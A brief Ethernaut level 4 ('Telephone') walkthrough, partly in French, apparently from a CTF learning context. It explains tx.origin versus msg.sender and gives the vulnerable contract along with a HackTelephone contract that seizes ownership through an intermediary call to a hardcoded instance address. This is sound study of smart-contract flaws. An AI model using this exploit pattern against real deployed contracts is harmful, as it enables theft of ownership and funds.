# Level 4 : Téléphone

**Ethernaut Level 4 : Telephone : verification by tx.origin**

`tx.origin`is the address of the **EOA(Externally Owned Accounts)** from which originates the transaction. While `msg.sender` is the address of the account from which the current call is coming which could be an EOA or a Contract Account (CA).

**With `msg.sender` the owner can be a contract.**

**With `tx.origin` the owner can never be a contract.**

Here we have to copy/paste telephone.sol in remix.ide 

Create another smart contract that import telephone.sol and redirect contract 2 toward the ethernaut telephone.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
  address public owner;
  constructor() {
    owner = msg.sender;
  }
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract HackTelephone {
    constructor(){
        Telephone tel = Telephone(0xacdF2e2a451d55692E89F48beEF5BA254b60a4CF);
        tel.changeOwner(0xB3890dB67fe0aD620c0eb012994D213Ab4EB8544);
    }
}
```

Then `await contract.owner()`